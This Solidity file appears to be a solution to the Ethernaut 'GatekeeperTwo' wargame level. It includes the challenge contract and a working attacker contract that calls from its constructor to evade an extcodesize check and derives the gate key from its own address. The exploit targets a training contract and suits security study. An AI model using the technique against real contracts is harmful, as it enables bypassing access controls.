pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GateCracker{
    //ethernaut
    address gate = 0xb2eab431129ab6ad9343749189bbab67869d7d1f;
    //address gate = 0x692a70d2e424a56d2c6c27aa97d1a86395877b3a;

    function GateCracker() public {
        uint64 gateKey = uint64(keccak256(address(this))) ^ (uint64(0) - 1);
        //bytes c;
        bytes8 b = bytes8(gateKey);
        bytes memory c = new bytes(8);
        for (uint i=0; i < 8; i++) {
            c[i] = b[i];
        }
        GatekeeperTwo gate_con = GatekeeperTwo(gate);
        gate_con.enter(b);
        selfdestruct(msg.sender);
    }
}